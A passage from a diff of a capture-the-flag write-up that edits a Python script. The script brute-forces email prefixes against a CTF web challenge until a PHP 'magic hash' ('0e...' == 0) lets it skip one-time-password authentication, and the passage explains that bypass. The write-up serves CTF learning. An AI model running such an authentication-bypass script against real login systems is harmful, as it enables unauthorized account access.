@@ -82,7 +82,7 @@ The function that handles the one-time-pass authenication can be found in the `a
  The code to solve this problem this way is avaiable here: 
 
  ```python
- import requests
+import requests
 import string
 import itertools
 import time
@@ -92,20 +92,20 @@ import hashlib
 url = "https://challenges.silicon-ctf.party:443/web500/index.php"
 count=1
 for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
-    data = {"uname": "admin", "otp": "0", "e":f"{email}@galacticempire.com", "id":"1"}
-    res=requests.post(url, data=data)
-    if res.status_code != 200:
-        print('\nRan into error - may need to slow down')
-        break
-    if "Incorrect OTP" in res.text:
-        pos = res.text.find("authorization_code")
-        auth_code=res.text[pos+20:pos+30]
-        print(f'Attempt {email}@galacticempire.com ... Try #{count} ... auth code {auth_code}', end="\r")
+   data = {"uname": "admin", "otp": "0", "e":f"{email}@galacticempire.com", "id":"1"}
+   res=requests.post(url, data=data)
+   if res.status_code != 200:
+       print('\nRan into error - may need to slow down')
+       break
+   if "Incorrect OTP" in res.text:
+       print(f'Attempt {email}@galacticempire.com ... Try #{count} ', end="\r")
 
-    else:
-        print(f'\n[*] Found bypass with: {email}@galacticempire.com')
-        with open('out.html','w') as f:
-            f.write(res.text)
-        break
+   else:
+       print(f'\n[*] Found bypass with: {email}@galacticempire.com')
+       with open('out.html','w') as f:
+           f.write(res.text)
+       break
+   count+=1
+
 ```
 Running this, you will see that the hash generated with the email: `amk@galacticempire.com` is 0e39042609. Which in php makes the statement `0e39042609 == 0` equate to true. Thereby bypassing the authentication. 
